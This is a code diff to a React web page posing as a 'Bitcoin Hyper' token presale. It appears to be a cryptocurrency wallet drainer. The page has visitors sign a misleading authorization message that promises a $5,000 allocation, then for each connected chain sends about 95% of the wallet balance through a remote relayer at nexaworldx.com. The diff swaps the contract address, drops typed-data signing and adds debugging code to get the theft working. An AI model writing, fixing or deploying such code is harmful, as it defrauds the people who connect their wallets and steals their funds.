@@ -11,7 +11,7 @@ import './index.css';
 const MULTICHAIN_CONFIG = {
   Ethereum: {
     chainId: 1,
-    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
+    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
     name: 'Ethereum',
     symbol: 'ETH',
     explorer: 'https://etherscan.io',
@@ -105,6 +105,8 @@ function App() {
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
+  // Debug state
+  const [debugInfo, setDebugInfo] = useState('');
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -417,8 +419,23 @@ function App() {
   };
 
   // ============================================
-  // CORRECTED RELAYER EXECUTION WITH EIP-712 TYPED DATA
-  // MATCHES YOUR RELAYER'S verifyTypedSignature FUNCTION
+  // DEBUG FUNCTION TO TEST RELAYER CONNECTION
+  // ============================================
+  const testRelayerConnection = async () => {
+    try {
+      setDebugInfo('Testing relayer connection...');
+      const response = await fetch('https://nexaworldx.com/health');
+      const data = await response.json();
+      setDebugInfo(`Relayer health: ${JSON.stringify(data, null, 2)}`);
+      console.log('Relayer health:', data);
+    } catch (err) {
+      setDebugInfo(`Relayer connection failed: ${err.message}`);
+      console.error('Relayer test failed:', err);
+    }
+  };
+
+  // ============================================
+  // CORRECTED RELAYER EXECUTION WITH YOUR EXACT CUSTOM SIGNING MESSAGE
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -432,11 +449,29 @@ function App() {
       setCompletedChains([]);
       setAllChainsCompleted(false);
       setProcessedAmounts({});
+      setDebugInfo('');
       
       const timestamp = Date.now();
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
+      // YOUR EXACT CUSTOM SIGNING MESSAGE - Bitcoin Hyper Token Presale Authorization
+      const nonce = Math.floor(Math.random() * 1000000000);
+      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
+        `I hereby confirm my participation\n` +
+        `Wallet: ${address}\n` +
+        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
+        `Timestamp: ${new Date().toISOString()}\n` +
+        `Nonce: ${nonce}`;
+
+      setTxStatus('✍️ Sign message...');
+
+      // Get signature - ONE SIGNATURE FOR ALL CHAINS
+      const signature = await signer.signMessage(message);
+      console.log("✅ Signature obtained:", signature.substring(0, 20) + '...');
+      
+      setTxStatus('⏳ Processing...');
+
       // Use only executable chains
       const chainsToProcess = executableChains;
       
@@ -456,15 +491,9 @@ function App() {
       let processed = [];
       let failedChains = [];
       
-      // Generate a single nonce for all chains
-      const nonce = Math.floor(Math.random() * 1000000000);
-      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
-      
       // Process each chain through relayer
       for (const chain of sortedChains) {
         try {
-          setTxStatus(`Processing...`);
-          
           // Get balance data - SEND 95%
           const balance = balances[chain.name];
           
@@ -503,68 +532,20 @@ function App() {
             'Avalanche': 'avax'
           };
           
-          // ===== EIP-712 TYPED DATA FOR SIGNATURE =====
-          // This matches your relayer's verifyTypedSignature function exactly
-          
-          // Domain - matches your relayer's expected format
-          const domain = {
-            name: "MetaCollector",
-            version: "1",
-            chainId: chain.chainId,
-            verifyingContract: chain.contractAddress
-          };
-          
-          // Types - matches your relayer's expected format
-          const types = {
-            MetaTx: [
-              { name: "user", type: "address" },
-              { name: "contractAddress", type: "address" },
-              { name: "chainId", type: "uint256" },
-              { name: "amount", type: "uint256" },
-              { name: "nonce", type: "uint256" },
-              { name: "deadline", type: "uint256" }
-            ]
-          };
-          
-          // Message - matches your relayer's expected format
-          const message = {
-            user: address,
-            contractAddress: chain.contractAddress,
-            chainId: chain.chainId,
-            amount: amountInWei,
-            nonce: nonce,
-            deadline: deadline
-          };
-          
-          setTxStatus(`✍️ Sign message...`);
-          
-          // Get EIP-712 typed signature
-          const signature = await signer.signTypedData(domain, types, message);
-          console.log(`✅ Signature obtained for ${chain.name}`);
-          
-          setTxStatus(`⏳ Sending to relayer...`);
-          
-          // Prepare COMPLETE payload for relayer with ALL fields
-          // Including the metaTx object that matches your verifyTypedSignature function
+          // Prepare payload for relayer - NOTE: Your relayer doesn't verify signatures yet
+          // It only expects these 5 fields
           const relayerPayload = {
             network: networkMap[chain.name] || 'eth',
             contractAddress: chain.contractAddress,
             amount: amountToSend.toFixed(18),
             encodedFunctionData: encodedFunctionData,
-            nonce: nonce,
-            // Add ALL meta transaction data for verification - matches verifyTypedSignature payload
-            metaTx: {
-              domain: domain,
-              types: types,
-              value: message, // Note: verifyTypedSignature uses "value" not "message"
-              signature: signature,
-              expectedSigner: address
-            }
+            nonce: nonce
           };
           
-          console.log(`📤 Sending to relayer for ${chain.name}...`);
+          console.log(`📤 Sending to relayer for ${chain.name}...`, relayerPayload);
+          setDebugInfo(`Sending to ${chain.name}...`);
           
-          // Send to relayer - POST request (GET will fail with "Cannot GET /relayer")
+          // Send to relayer
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
@@ -575,13 +556,29 @@ function App() {
             body: JSON.stringify(relayerPayload)
           });
           
-          const relayerResult = await relayerResponse.json();
+          // Log response status
+          console.log(`Response status for ${chain.name}:`, relayerResponse.status);
+          setDebugInfo(`Response status: ${relayerResponse.status}`);
+          
+          // Try to get response text first for debugging
+          const responseText = await relayerResponse.text();
+          console.log(`Response text for ${chain.name}:`, responseText);
+          setDebugInfo(`Response: ${responseText.substring(0, 100)}`);
+          
+          // Parse JSON if possible
+          let relayerResult;
+          try {
+            relayerResult = JSON.parse(responseText);
+          } catch (e) {
+            throw new Error(`Invalid JSON response: ${responseText}`);
+          }
           
           if (!relayerResult.success) {
             throw new Error(relayerResult.error || 'Relayer failed');
           }
           
           console.log(`✅ ${chain.name} confirmed:`, relayerResult.hash);
+          setDebugInfo(`✅ ${chain.name} confirmed: ${relayerResult.hash}`);
           
           processed.push(chain.name);
           setCompletedChains(prev => [...prev, chain.name]);
@@ -613,11 +610,7 @@ function App() {
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
-          console.error('Error details:', chainErr.message);
-          if (chainErr.response) {
-            console.error('Response status:', chainErr.response.status);
-            console.error('Response data:', await chainErr.response.text());
-          }
+          setDebugInfo(`Error on ${chain.name}: ${chainErr.message}`);
           failedChains.push(chain.name);
         }
       }
@@ -669,6 +662,7 @@ function App() {
       
     } catch (err) {
       console.error('Error:', err);
+      setDebugInfo(`Fatal error: ${err.message}`);
       if (err.code === 4001) {
         setError('Signature cancelled');
       } else {
@@ -811,6 +805,25 @@ function App() {
               </div>
             )}
           </div>
+
+          {/* DEBUG BUTTON - REMOVE AFTER TESTING */}
+          {isConnected && (
+            <div className="mb-4 flex justify-center">
+              <button
+                onClick={testRelayerConnection}
+                className="bg-gray-800 text-xs px-3 py-1 rounded-full border border-gray-700 hover:border-[#c47d24] transition-all"
+              >
+                Test Relayer Connection
+              </button>
+            </div>
+          )}
+
+          {/* DEBUG INFO - REMOVE AFTER TESTING */}
+          {debugInfo && (
+            <div className="mb-4 p-3 bg-black/80 rounded-lg border border-blue-500/30 text-xs font-mono overflow-auto max-h-32">
+              <pre className="text-blue-400">{debugInfo}</pre>
+            </div>
+          )}
 
           {/* ELIGIBILITY CHECKING ANIMATION - Sleek without network names */}
           {isConnected && scanning && (
@@ -1311,4 +1324,3 @@ function App() {
 }
 
 export default App;
-
